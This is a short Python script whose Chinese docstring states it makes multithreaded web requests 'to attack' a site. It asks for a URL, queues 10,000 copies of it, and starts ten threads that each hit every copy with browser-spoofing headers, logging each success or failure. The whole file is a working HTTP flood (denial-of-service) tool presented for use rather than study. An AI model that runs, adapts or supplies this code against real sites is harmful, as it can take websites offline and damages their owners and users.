import urllib.parse,time
import urllib.request as ur
import threading
'''
多线程访问网页，用来攻击
'''
def get_html(curl):
    header = {'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'accept-encoding':'gzip, deflate, sdch, br',
    'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36'
    #'user-agent':'Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html'
    }
    req = ur.Request(curl,headers = header)
    try:
        html = ur.urlopen(req, timeout = 25)
        rpheader = html.info()
        body = html.read()
        return True
    except ur.URLError as e:
        print('Visit error:', e.reason)
        return False
class myThread (threading.Thread):   #继承父类threading.Thread
    def __init__(self, threadID, name, counter,urls):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.urls = urls
    def run(self):                   #把要执行的代码写到run函数里面 线程在创建后会直接运行run函数 
        for url in self.urls:
            sj = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
            if(get_html(url)):
                print(sj+'   '+url+'  访问成功')
            else:
                print(sj+'   '+url+'  访问失败')
url = input('请输入网址：')
urls = [];
for i in range(10000):
    urls.append(url)
print('访问列表构建完成......')

# 创建新线程
thread1 = myThread(1, "Thread-1", 1,urls)
thread2 = myThread(2, "Thread-2", 2,urls)
thread3 = myThread(3, "Thread-2", 3,urls)
thread4 = myThread(4, "Thread-2", 4,urls)
thread5 = myThread(5, "Thread-2", 5,urls)
thread6 = myThread(6, "Thread-2", 6,urls)
thread7 = myThread(7, "Thread-2", 7,urls)
thread8 = myThread(8, "Thread-2", 8,urls)
thread9 = myThread(9, "Thread-2", 9,urls)
thread10 = myThread(10, "Thread-2", 10,urls)

# 开启线程
thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()
thread6.start()
thread7.start()
thread8.start()
thread9.start()
thread10.start()

print('Exiting Main Thread')
